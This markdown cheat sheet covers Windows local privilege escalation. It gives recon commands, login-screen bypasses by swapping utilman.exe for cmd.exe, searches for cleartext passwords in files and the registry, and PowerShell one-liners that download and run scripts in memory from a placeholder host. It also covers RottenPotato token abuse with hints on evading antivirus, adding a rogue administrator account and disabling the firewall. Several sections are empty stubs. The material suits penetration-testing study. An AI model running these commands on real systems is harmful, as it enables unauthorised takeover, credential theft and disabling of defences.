# Windows - Local Privilege Escalation

### Recon

#### Initial recon

The following commands can be used to grasp a better understanding of the
current system:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **OS details**  | systeminfo | [environment]::OSVersion.Version |  |
| **OS Architecture** | echo %PROCESSOR_ARCHITECTURE% |  [Environment]::Is64BitOperatingSystem | wmic os get osarchitecture |
| **Hostname**  | hostname | $env:ComputerName<br/>(Get-WmiObject Win32_ComputerSystem).Name ||
| **Curent Domain** | echo %userdomain% | $env:UserDomain<br/>(Get-WmiObject Win32_ComputerSystem).Domain ||
| **Curent User**  | whoami /all<br/>net user %username%  | $env:UserName<br/>(Get-WmiObject Win32_ComputerSystem).UserName | |
| **List host local users**  | net users |  | wmic USERACCOUNT list full |
| **List host local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
| **Local admin users** | net localgroup Administrators | | |
| **Connected users** | qwinsta | | |
| **Powershell version**  | Powershell  $psversiontable | $psversiontable ||
| **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
| **Credential Manager** | cmdkey /list | | |
| **Mounted disks** | | | wmic volume get DriveLetter,FileSystem,Capacity |
| **Writable directories** | dir /a-rd /s /b | | |
| **Writable files** | dir /a-r-d /s /b | | | |

#### Process, services, installed programs and scheduled tasks

The following commands can be used to retrieve the process, services,
installed programs and scheduled tasks of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **Process** | tasklist | get-process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |

#### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| Network interfaces | ipconfig | | |
| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |


### Exploit

#### Physical access privileges escalation

Physical access open up different ways to bypass user login screen and
obtain SYSTEM access from no account.

###### Hardened system

The methods detailed below require to boot from a live CD/DVD or USB key. The
possibility to do so may be disabled by BIOS settings. To conduct the
attack below, an access to the BIOS or a reset to default settings must be
accomplished.  

Manufacturers may have defined a default BIOS password, some of which are
listed on the following resource
http://www.uktsupport.co.uk/reference/biosp.htm

Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
the motherboard Jumper.

###### PCUnlocker

PCUnlocker is a password-unlocking software that can be used to reset lost
Windows users password. it can be burn on a CD/DVD or installed on a bootable
USB key.

The procedure to create a bootable USB key and reset local Windows users
passwords is as follow:

  1. Download Rufus and PCUnlocker
  2. Create a bootable USK key using Rufus with the PCUnlocker ISO.  
     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition scheme for UEFI computer" option on Rufus
  3. Boot on the USB Key thus created (boot order may need to be changed in BIOS)
  4. From the PCUnlocker GUI, pick an account and click the "Reset Password"
     button to reset the password to "Password123"

To create a bootable CD/DVD, simply use any CD/DVD burner with the PCUnlocker
ISO and follow steps 3 & 4.  
If used on a Domain Controller, PCUnlocker can be used to reset Domain users
password by updating the ntds.dit file.

###### utilman.exe

The utilman utility tool can be launched at the login screen before
authentication as NT AUTHORITY\SYSTEM. By using a Windows instalation CD/DVD,
it is possible to replace the utilman.exe by cmd.exe to gain access to a CMD
shell as SYSTEM without authentication.

The procedure to do so is as follow:

  1. Download the Windows ISO corresponding to the attacked system and burn it
     to a CD/DVD
  2. Boot on the thus created CD/DVD
  3. Pick the "Repair your computer" option
  4. Select the “Use recovery tools [...]" option, pick the operating system from the list and click "Next"
  5. A command prompt should open, enter the following commands:
      - cd windows\system32
      - ren utilman.exe utilman.exe.bak
      - copy cmd.exe utilman.exe
  6. Remove the CD/DVD and boot the system normally.
  7. On the login screen, press the key combination Windows Key + U
  8. A command prompt should open with NT AUTHORITY\SYSTEM rights
  9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new user


#### File system & registry

###### Clear text password in files

Search for clear text passwords stored in files. Use the keyword 'password'
first and broaden the search if needed by searching for 'pass':

```
# Search 'password' in all txt/xml/ini files
findstr /si "password" *.txt
findstr /si "password" *.xml
findstr /si "password" *.ini

# Search 'password'/'pass' in all files
findstr /spin "password" *.*
findstr /spin "pass" *.*
findstr /spin "savecred" *.*

# Search for runas with savecred in files
findstr /s /i /m "savecred" *.*
findstr /s /i /m "runas" *.*

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*
```

The following files, if present on the sytem, may contain cleartext or base64
encoded passwords and should be reviewed:

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

###### Clear text password in registry

Passwords may also be stored in registry:

```
# runas

rundll32.exe keymgr.dll,KRShowKeyMgr

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
```

###### Hidden files

To display only hidden files, the following command can be used:

```
dir /s /ah /b
dir C:\ /s /ah /b

Get-Childitem -Recurse -Hidden
```

###### Files of interest

The following files may contains sensible information:

```
# PowerShell commands history
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Unpatched system

###### OS and Kernel vulnerabilities

The following commands or actions can be used to get the updates installed on
the host:

| DOS | Powershell | WMI |
|-----|------------|-----|
| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix | wmic qfe get Caption,Description,HotFixID,InstalledOn |

Automatically compare the system patch level to public known exploits:

*Windows Exploit Suggester*

The windows-exploit-suggester tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches
on the target.  
It also notifies the user if there are public exploits and Metasploit modules
available for the missing bulletins.  
It requires the 'systeminfo' command output from a Windows host in order to
compare that the Microsoft security bulletin database and determine the patch
level of the host.  
It has the ability to automatically download the security bulletin database
from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

```
# python windows-exploit-suggester.py --update

python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO>
```

If the 'systeminfo' command reveals 'File 1' as the output for the hotfixes,
try executing 'wmic qfe list full' and feed that as input with the --hotfixes
flag, along with the 'systeminfo':

```
python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
```

*Sherlock*

PowerShell script to find missing software patches for critical vulnerabilities
that could be leveraged for local privilege escalation.

To download and execute directly into memory:

```
# CMD
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
```

*(Metasploit) Local Exploit Suggester*

The Local Exploit Suggester module suggests local meterpreter exploits that can
 be used against the target, based on the architecture and platform as well as
 the available exploits in meterpreter.

 ```
meterpreter > run post/multi/recon/local_exploit_suggester

# OR

msf > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session-id>
msf post(local_exploit_suggester) > run
```

*PyInstaller*

If an exploit is only available as a Python script and Python is not installed
on the target, PyInstaller can be used to compile a stand alone executable of
the Python script:

```
pyinstaller --onefile <SCRIPT>.py
```

PyInstaller should be used on a Windows operating system.

###### Third party components

The following third party components may be vulnerable and leveraged to
privilege escalation:

```
Ubiquiti UniFi Video
-- CVE-2016-6914
-- Affected versions: 3.7.3, 3.7.0, 3.2.2 & potentially older versions
-- Fixed in version 3.8.0
-- https://www.exploit-db.com/exploits/43390/
```

#### Services

###### Weak services permissions

###### Unquoted services path

When a service path is unquoted, the Service Manager will try to find the
service binary in the shortest path, moving up to the longest path until one
works.     
For example, in the case of the path C:\Service Folder\Service.exe, the space
is treated as an optional path to explore for that service. The resolution
process will first look into C:\Service for the Service.exe binary and, if it
exist, use to start the service.    
In summary, a service is vulnerable if the path to the executable has a space
in the filename and the file name is not wrapped in quote marks; exploitation
requires write permissions to the path before the quote mark. If a service is
vulnerable, it can be leveraged to escalate privileges to the level of the
account that starts the service.  

To find vulnerable services the PowerUp script the
exploit/windows/local/trusted_service_path metasploit module can be used as
well the following commands:

```
# wmic
wmic service get name.pathname,startmode | findstr /i /v """
wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"

# (PowerShell) PowerSploit's PowerUp Get-ServiceUnquoted
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
Get-ServiceUnquoted

# Metasploit
exploit/windows/local/trusted_service_path
```

###### Update and restart service

To modifiy a service binary:

To restart a service:

```
# Stop
net stop <SERVICE>
Stop-Service -Name <SERVICE> -Force

# Start
net start <SERVICE>
Start-Service -Name <SERVICE>
```



#### AlwaysInstallElevated

#### Token Privileges abuse

Use the following command to retrieve the current user account token privileges:
```bash
whoami /priv
```

The following tokens can be exploited to gain SYSTEM access privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

*Rotten Potato w/ Metasploit*

RottenPotato can be used in combination with the Metasploit meterpreter
incognito module to abuse the privileges above in order to elevate privilege to
SYSTEM.

Source: https://github.com/breenmachine/RottenPotatoNG

```bash
# Load the incognito module to toy with tokens
meterpreter > load incognito

# Upload the MSFRottenPotato binary on the target
# Some obfuscation may be needed in order to bypass AV
meterpreter > upload MSFRottenPotato.exe .

# The command may need to be run a few times
meterpreter > execute -f 'MSFRottenPotato.exe'
meterpreter > execute -f 'MSFRottenPotato.exe' -a '1 cmd.exe'

# The NT AUTHORITY\SYSTEM token should be available as a delegation token
# Even if the token is not displayed it might be available and the impersonation should be tried anyway
meterpreter > list_tokens -u
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
```

*LonelyPottato (RottenPotato w/o Metasploit)*

### Post-Exploit

#### Administrator to SYSTEM

The system account and the administrator account (Administrators group) have
the same file privileges, but they have different functions.  
The system account is used by the operating system and by services that run
under Windows. It is an internal account, does not show up in User Manager,
cannot be added to any groups, and cannot have user rights assigned to it.  
The system account is needed by tools that make us of Debug Privilege
(such as mimikatz) which allows someone to debug a process that they wouldn’t
otherwise have access to.

The PsExec Microsoft signed tool can be used to elevate to system privilege from
an administrator account:

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec.exe -s -i -d cmd.exe
```

If a meterpreter is being used, the **getsystem** command can be leveraged to achieve the same end.

#### Add local Administrator

The net user commands can be used to create and add a windows account in the
administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

#### Manage Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```bash
netsh advfirewall show allprofiles
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private
network, Windows enables network discovery features, allows file sharing and
other networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

To disable the firewall use the following commands:

```
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```
